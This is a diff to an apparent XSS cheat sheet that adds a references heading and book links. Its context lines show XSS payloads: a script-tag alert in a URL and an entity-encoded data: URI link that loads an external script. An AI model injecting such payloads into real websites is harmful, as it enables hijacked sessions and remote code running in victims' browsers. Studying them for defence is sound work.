@@ -698,6 +698,8 @@ http://www.<script>alert(1)</script .com
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
 ```
 
+#### References :
+
 ###### Cross-site Scripting (XSS)
 
 * 👉 https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
@@ -729,3 +731,9 @@ http://www.<script>alert(1)</script .com
 ###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode
 
 * 👉 https://www.veracode.com/security/xss
+
+#### Recommended books :
+
+* [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C)
+
+* [XSS Cheat Sheet](https://leanpub.com/xss)
